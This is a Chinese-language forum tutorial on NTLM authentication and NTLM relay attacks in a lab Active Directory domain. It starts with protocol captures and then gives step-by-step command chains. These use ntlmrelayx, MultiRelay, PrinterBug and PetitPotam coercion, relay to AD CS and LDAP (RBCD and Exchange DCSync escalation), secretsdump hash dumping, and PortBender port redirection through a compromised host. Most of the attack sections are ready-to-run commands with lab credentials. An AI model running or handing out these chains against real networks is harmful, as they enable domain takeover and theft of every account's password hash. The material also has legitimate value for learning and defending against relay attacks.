认证机制
----

NTLM采用一种质询/应答模式的身份验证机制

### 工作组

![199.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-40d22453a8c674c66ec94469bde42afd20d20a9e.png)

1. 协商
2. 质询
3. 身份验证 
    - 当客户端想要访问某个服务时，此时客户端会在本地缓存一份服务密码的NTLM Hash,然后向服务器发送Negotiate消息。（消息中包含明文表示的用户名与其他协商信息）

- 服务器收到客户端发送的消息后，先判断本地是否有消息中的用户名，如果存在就会提供自己支持的服务内容，回复Challenge消息。（消息中包含一个由服务端随机生成的16位Challenge，服务端也会缓存此Challenge）
- 客户端收到消息后，使用1中本地缓存的NTLM Hash对Challenge进行加密生成Responce，然后将Responce、用户名、Challenge组合得到Net-NTLM Hash，然后发送给服务端。
- 服务端收到消息（Net-NTLM Hash）后，用本地自己密码的NTLM Hash对第二步中本地缓存的Challenge进行加密，然后与收到的Responce进行比较，如果一致就认证成功。
    
    ### 域环境

![200.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-f6241d6be6b6c24bf808d30ad0e9af187529c7e5.png)  
由于域环境中密码是存储在域控中的NTDS.dit中的，因此还需要域控进行认证

- 当客户端想要访问某个服务时，此时客户端会在本地缓存一份服务密码的NTLM Hash,然后向服务器发送Negotiate消息。（消息中包含明文表示的用户名与其他协商信息）
- 服务器收到客户端发送的消息后，先判断本地是否有消息中的用户名，如果存在就会提供自己支持的服务内容，回复Challenge消息。（消息中包含一个由服务端随机生成的16位Challenge，服务端也会缓存此Challenge）
- 客户端收到消息后，使用1中本地缓存的NTLM Hash对Challenge进行加密生成Responce，然后将Responce、用户名、Challenge组合得到Net-NTLM Hash，然后发送给服务端。
- 服务端收到消息（Net-NTLM Hash）后将其发送给域控，域控根据消息中的用户名获取本地存储的该用户名的NTLM Hash，用其对Challenge进行加密，然后与Responce进行比较，如果一致则认证成功。
- 服务端根据域控返回的结果对客户端进行反应。
    
    ### 抓包分析
    
    利用wireshark抓包简单看看流程，这里就看工作组的认证  
    win10与win7建立ipc连接，然后wireshark抓包测试  
    前四个包是协商

![126.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-1ebe27f4085b2640c8e28861611cc7793767246c.png)

![121.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-652e9de64dc319055039ee5f8ed0975cae8d5736.png)

![122.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-0ce1b04cace766a662e803571e3dbe7cb658a17c.png)  
这里可以看到win7主机返回了Challenge

![123.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-a5acf3080f663678e25e04b8b1a3e9736842be53.png)  
客户端收到Challenge后，使用1中本地缓存的NTLM Hash对Challenge进行加密生成Responce，然后将Responce、用户名、Challenge组合得到Net-NTLM Hash，然后发送给服务端。

![124.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-909cb7e473637411890cb644f78ad8ed4d8b197c.png)

### Net-NTLM Hash的组成

```php
#Net-NTLM Hash v1
username:hostname:LM responce:NTLM responce:challenge
#Net-NTLM Hash v2
username:domain:challenge:HMAC-MD5:blob
```

现在基本都是v2了，我们抓包具体看看v2的组成，主要就是Type2、Type3里面的内容  
Type2中获得challenge

```php
NTLM Server Challenge: 291b8a56a1646beb
```

![123.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-85b0568f04460a220e485ec0f15f808bb73d9d3a.png)  
Type3中获得username、domain、HMAC-MD5、blob  
（其中HMAC-MD5就是NTProofStr、blob即Responce减去NTProofStr）

```php
User name: tes
Domain name: DESKTOP-05ROOG9
HMAC-MD5(NTProofStr): 941e0b3ed496f3e723a4ba53171d8ad0
blob：0101000000000000b8923acf1609d901163360923143a2120000000002000c004800410043004b004d00590001001e00570049004e002d0046004e004c004f004d00540051004400480055005100040014006800610063006b006d0079002e0063006f006d0003003400570049004e002d0046004e004c004f004d005400510044004800550051002e006800610063006b006d0079002e0063006f006d00050014006800610063006b006d0079002e0063006f006d0007000800b8923acf1609d90106000400020000000800300030000000000000000100000000200000d384de6f2cc6b2c10b6e707fedcf6d256ce52574dfad4dc7cfecf7a50ac359e40a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310030002e00310033003200000000000000000000000000
```

![125.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-16330425ad7105ae32c55ef96c1e41692c5b88ae.png)  
所以组合起来就是

```php
tes:DESKTOP-05ROOG9:291b8a56a1646beb:941e0b3ed496f3e723a4ba53171d8ad0:0101000000000000b8923acf1609d901163360923143a2120000000002000c004800410043004b004d00590001001e00570049004e002d0046004e004c004f004d00540051004400480055005100040014006800610063006b006d0079002e0063006f006d0003003400570049004e002d0046004e004c004f004d005400510044004800550051002e006800610063006b006d0079002e0063006f006d00050014006800610063006b006d0079002e0063006f006d0007000800b8923acf1609d90106000400020000000800300030000000000000000100000000200000d384de6f2cc6b2c10b6e707fedcf6d256ce52574dfad4dc7cfecf7a50ac359e40a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310030002e00310033003200000000000000000000000000
```

大致利用流程
------

实际可以根据中间人攻击（实质就是钓鱼），或者利用漏洞强制进行认证流程，获取到Net-NTLM Hash。利用对其进行密码破解，或者重放给要攻击的机器。

中继攻击一般使用在域环境中，因为工作组中每个机器密码都不一样，而且密码都存储在自己本地的SAM文件中，因此无法中继到别的机器；

而域环境中的密码都存储在域控的NTDS.dit中，如果没有对域用户进行登录的限制，那么就可以利用。

NTLM常用攻击手法
----------

### 基础知识

NTLM是一种嵌入式协议，消息传输依赖上层协议（SMB、LDAP、FTP、POP3、HTTP、HTTPS、MYSSQL等），  
因此只要只用这些协议的程序都可以要求用户发起NTLM认证请求，因此可以尝试进行截获其Net-NTLM Hash。  
可以结合Responder进行获取

### 系统命令

windwos系统中有很多命令可以传入UNC，在执行对目标主机发起NTLM认证

```php
net use \\ip地址
dir \\ip地址
等
```

![202.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-3a482decb17592f2c9f914f0bf6e435d6e7ced4b.png)

![201.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-86329d31cfa0ce354adf678412c305f603ab364d.png)

Web漏洞获取
-------

### 文件包含

可以通过远程文件包含来获取对方机器的Net NTLM-Hash，不受是否开启远程包含影响

![204.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-e4732024eeaa23a85262ce65c90a7055cccc21e7.png)  
其余的就没有写了

域环境下利用
------

### 拓扑环境

![205.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-083cb27421fc4620549c970d64fb8a7b69b00db9.png)

### 基础

实验环境都中继到win7（10.10.10.201）

当域管理用户（实验发现域用户一般无法中继成功），访问我们恶意的服务时，便可以通过中继拿到被中继主机的shell，或在其上执行命令。  
我们还需要查看对方是否开启smb签名（域控默认开启），因此无法中继到域控，我们可以利用/usr/share/responder/tools中的RunFinger.py

来进行探测网络中，没有开启smb签名的机器来进行中继

```php
python3 RunFinger.py -i 10.10.10.0/24  
```

![206.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-d493685db4617be7927018570541cb22c4a12842.png)

### ntlmrelayx.py

```php
python3 ntlmrelayx.py -t 10.10.10.201 -c "ipconfig" -smb2support
```

![207.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-1fb8d5b6c9570d159ffd0712e25c54bf8eacff8c.png)

### smbrealy.py

```php
python3 smbrelayx.py -h 10.10.10.201 -c "whoami"
```

![209.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-87c831518441529785e530b117dd4634cfb2e1ec.png)

### MultiRelay.py

```php
python3 MultiRelay.py -t 10.10.10.201 -u ALL 
```

![210.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-8beef3d4ff6002e47ce6f795efb4642ee5883553.png)

### PrinterBug漏洞

需要一个域用户的账户  
通过printerbug.py连接到受害机器（10.10.10.80），迫使其连接到受控的服务器（10.10.10.128）进行ntlm认证，可以结合上述工具抓取Net-Ntlm Hash或者执行命令

```php
python3 printerbug.py hackmy.com/administrator:033478Qaz@10.10.10.80 10.10.10.128
```

![236.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-0c4fa899a488b52c27a4046bddf84ae3cd8b6f57.png)

![237.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-f43e38ac25db6d8b8f6a45bbbeec3cb5d0563c05.png)

### PetitPotam漏洞

通过PetitPotam.py连接到受害机器（10.10.10.80），迫使其连接到受控的服务器（10.10.10.128）进行ntlm认证，可以结合上述工具抓取Net-Ntlm Hash或者执行命令

```php
python3 PetitPotam.py -d hackmy.com -u win7 -p 123456Asd 10.10.10.128 10.10.10.80 
```

![238.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-578b2ef7bbc4babda1d88862fe2e58aed52543f7.png)

![239.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-231d29860931fad37276a1b862f9a0adfcf1989f.png)

### 中继至AD CS

AD CS证书服务（SSL证书）：  
可以部署企业根或独立根建立SSL加密通道，这是所有服务器证书，无论品牌、申请方式都可以起到的功能，唯一的价值区别在于加密强度，目前，达到128位对称加密强度的服务器证书均可以实现有保障的加密通道。

#### 测试环境

```php
DC          10.10.10.10
辅DC+ADCS    10.10.10.111
域用户       10.10.10.130
kali        10.10.10.143
```

#### 利用流程

- 利用PetitPotam或printerbug迫使域控使用机器账户发起NTLM认证请求
- 将域控发起的NTLM认证请求中继到AD CS的Web注册接口
- 利用证书模板为域控机器账户申请证书
- 利用申请到的证书进行进一步的操作，以获取域控权限

定位域内AD CS证书服务器

```php
certutil -CA
```

![127.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-796672a5e483efd69a4091d02a03bc4c076b5316.png)

![128.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-904c1ee4d1f2b1e7511aedf5c6af9808a5e05036.png)  
kali执行如下命令（实战中是恶意服务器下执行）

```php
python3 ntlmrelayx.py -t http://10.10.10.111/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

--template      #指定证书模板
```

利用PetitPotam.py强制使DC向kali（受控的服务器）发起认证请求

```php
python3 PetitPotam.py 10.10.10.143 10.10.10.10
```

![129.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-e936139d94961b5176852df3a1ebb273bd3c1f03.png)  
此时ntlmrelay即可获得域控机器账户base64编码格式的证书

![130.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-60c1e63ecfd253b906ae26fb908e54a03d1ee14e.png)  
使用gettgtpkinit.py结合获得的证书去申请票据

```php
python3 gettgtpkinit.py -pfx-base64 "MIIRtQIBAzCCEW8GC......K1BAgQMyWi4+VhTA==" -dc-ip 10.10.10.10 hackmy.com/WIN-7D8NKLK78H0\$ DC.ccache
```

![131.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-eeb981e138554fbbb41ffed9c3a9b9e6dd5b0518.png)  
我们可以直接进行Dcsync的操作，因为是域控机器账户的票据  
（后面环境变了，所以计算机名字变了）

```php
export KRB5CCNAME=DC.ccache
python3 secretsdump.py WIN-V8LD0K26U5I.hackmy.com -k -no-pass -target-ip 10.10.10.10 -dc-ip 10.10.10.10
```

#### 抓包分析

我们接下来利用Wireshark抓包看看  
域控向kali（恶意服务器）发起的NTLM认证请求

![137.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-7ab23478e43eb2a56a7d3255937e94aedca43b47.png)

![138.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-c5e15cf35fa06a40cd789d6d7ca2263f103ed5aa.png)  
我们看看第三步，这些是啥就不在叙述了（很明了了）

![139.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-3f506ee3f9bbb7f6a1f3e4f93cd583e577605c5a.png)  
然后我们再来看看AD CS上http的认证请求，恶意服务器将获得的凭证去请求AD CS的认证

![140.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-5aaf513a2ba13f8445b5474fffa3d18aebfb7876.png)  
很显然，一目了然，将获得的凭证尝试去认证

![141.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-3e5c59a63be0f746de29f42d50b393853899a48b.png)

### 中继至LDAP

#### Ldap签名

除了relay到smb，relay到ldap也是很常用的，比如CVE-2018-8581和CVE-2019-1040就利用到了这一点。  
relay到ldap也是要求被攻击机器不开启ldap签名的。在默认情况下，ldap服务器就在域控里面，而且默认策略就是协商签名。而不是强制签名。  
也就是说是否签名是由客户端决定的。服务端跟客户端协商是否签名。  
(客户端分情况，如果是smb协议的话，默认要求签名的，如果是webadv或者http协议，是不要求签名的)

#### CVE-2019-1040

漏洞可绕过NTLM MIC的防护机制，以使我们修改标志位，来让服务器不进行ldap签名。

#### RBCD+petitpotam

大多数情况我们获得的用户都是普通的域用户权限，因此无法Write Dcsync ACL操作。因此我们可以利用Relay to LDAP操作活动目录来为  
指定机器设置基于资源的约束委派（RBCD）。

##### 环境

![147.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-458520eacc5dc97bf506220e3cc1d002e1b7fa37.png)  
利用impacket中的addcomputer.py脚本，利用普通域用户在域中添加一个机器账户  
机器账户名：test$  
密码：passwdwd

```php
python3 addcomputer.py hackmy.com/win10:123456Qwe -computer-name test\$ -computer-pass 033478Passwd -dc-ip 10.10.10.10
```

![142.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-d132e1a3cac8936113a252de73af41982f1ac75b.png)  
在kali（实际为恶意服务器）上启动监听

```php
python3 ntlmrelayx.py -t ldap://10.10.10.10 -debug --delegate-access --escalate-user test\$ -smb2support --remove-mic

--remove-mic        #消除NTLM中的MIC标志
--escalate-user     #指定要提升权限的用户
```

使用PetitPotam.py强制域内机器连接到恶意服务器（在低版本(08和12)的情况下，可以匿名触发，不需要域用户。在16版本以上，就需要指定一个普通域用户账号和密码）

```php
python3 PetitPotam.py -d hackmy.com -u win10 -p 123456Qwe 10.10.10.143 10.10.10.132
```

此时已经成功设置了test$机器账户基于WIN-FNLOMTQDHUQ（win7）机器的基于资源的约束委派

![143.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-12051b4bfb5bf374a55e26d6803066aba0c22be8.png)  
利用impacket中的getST.py脚本进行基于资源的约束委派攻击，生成票据

```php
python3 getST.py hackmy.com/test\$:033478Passwd -spn cifs/WIN-FNLOMTQDHUQ.hackmy.com -impersonate Administrator -dc-ip 10.10.10.10
```

![144.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-c3bbbf3a3a6c9eed39baa2dcb63eed3bb6e35647.png)  
导入票据，即可获得WIN-FNLOMTQDHUQ（win7）机器的权限（如果PetitPotam.py阶段是域控请求，那么将获得域控的权限）

```php
KRB5CCNAME=Administrator.ccache python3 psexec.py -k WIN-FNLOMTQDHUQ.hackmy.com -target-ip 10.10.10.132 -dc-ip 10.10.10.10 -no-pass
```

![145.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-426bd592181c049ae3937299c3bcc909ee43500d.png)

```php
KRB5CCNAME=Administrator.ccache python3 smbexec.py -k WIN-FNLOMTQDHUQ.hackmy.com -target-ip 10.10.10.132 -dc-ip 10.10.10.10 -no-pass
```

![146.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-8a46830963407125ba7979e6d7247d9449ca3698.png)

#### Exchange+petitpotam

Exchange机器用户具有write-acl权限，可以给任意用户提权，赋予Dcsync的权限，从而dump出所有密码哈希值。

##### 利用条件

- Exchange服务器可以是任何版本（包括为PrivExchange修补的版本）。唯一的要求是，在以共享权限或RBAC模式安装，Exchange默认具有高权限。
- 域内任意账户。
- CVE-2019-1040漏洞的实质是NTLM数据包完整性校验存在缺陷，故可以修改NTLM身份验证数据包而不会使身份验证失效。而此攻击链中攻击者删除了数据包中阻止从SMB转发到LDAP的标志。
- 构造请求使Exchange Server向攻击者进行身份验证，并通过LDAP将该身份验证中继到域控制器，即可使用中继受害者的权限在Active Directory中执行操作。比如为攻击者帐户授予DCSync权限。
- 如果在可信但完全不同的AD林中有用户，同样可以在域中执行完全相同的攻击。 ##### 环境

![148.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-b2ddbde2336696961b9714a5a09cc4d1f667e91b.png)  
在kali（恶意服务器）上启动ntlmrelayx监听

```php
python3 ntlmrelayx.py -t ldap://10.10.10.10  --remove-mic --escalate-user win10 -smb2support

--remove-mic        #消除NTLM中的MIC标志
--escalate-user     #指定要提升权限的用户
```

利用PetitPotam强制Exchange机器与kali（恶意服务器）连接，ntlmrelayx.py将截获Exchange机器账户的Net-NTLM Hash，  
并将其中继到域控机器的LDAP服务。由于Exchange的机器账户默认拥有WriteDACL的权限，因此将赋予指定的普通域用户DCSync权限。

```php
python3 PetitPotam.py -d hackmy.com -u win10 -p 123456Qwe 10.10.10.143 10.10.10.11
```

![149.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-e571be6f143d6fd8a07ecf9f76b1474fc3ee0729.png)

![150.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-373458cdade6fac4a0e55e3013ff5c7a2180f426.png)  
此时win10账户已经有了DCSync的权限

```php
python3 secretsdump.py hackmy.com/win10:"123456Qwe"@10.10.10.10 -just-dc-ntlm
```

![151.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-1f310d4ded97047452f987fc9450faf2e3dd7eb8.png)

实战中的NTLM中继
----------

### 基础

实际中，当我们获得了一个外网的服务器权限，想要利用其中继拿到内网主机的shell，由于我们的kali处于外网，因此我们需要借用那台已经被拿下的机器。  
但是445端口一般处于被占用状态的，因此我们需要利用端口复用技术，将445复用到别的端口，然后将其转发到kali的445端口上。  
（用被攻陷的机器作为恶意的服务器）

### 拓扑环境

![235.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-f42d23bbb2018be30381dd6109b0917d8f948ca4.png)  
将PortBender.dll和WinDivert64.sys（根据版本选择）上传到对方机器，只要在同一目录就行

![211.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-51c82e13980014dfe062a28a34ebe6b1737cda44.png)  
利用PortBender将445复用到其余端口（需要管理员权限）

```php
PortBender redirect 445 7445
```

![212.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-137367d4035962ef88c42c95584c29c98e53180c.png)  
然后将7445端口转发到kali的445端口

```php
rportfwd 7445 192.168.111.128 445
```

![213.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-5f4797e6545784d364a5b9efe66c42a28fc50ed6.png)  
需要开启代理，因为要中继内网的机器  
等具有域管理员的机器访问被攻陷的机器，或者被攻陷的机器自己访问自己时，即可拿到被中继机器的shell

```php
proxychains python3 MultiRelay.py -t 10.10.10.201 -u ALL
```

![214.PNG](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-1651f4e5fdc8e17bc8e14ea7d171c4d7456c1aca.png)  
关于工作组的利用，主要就是土豆系列漏洞，后面专门出一篇详细的介绍（包括原理以及自己编写程序实现免杀）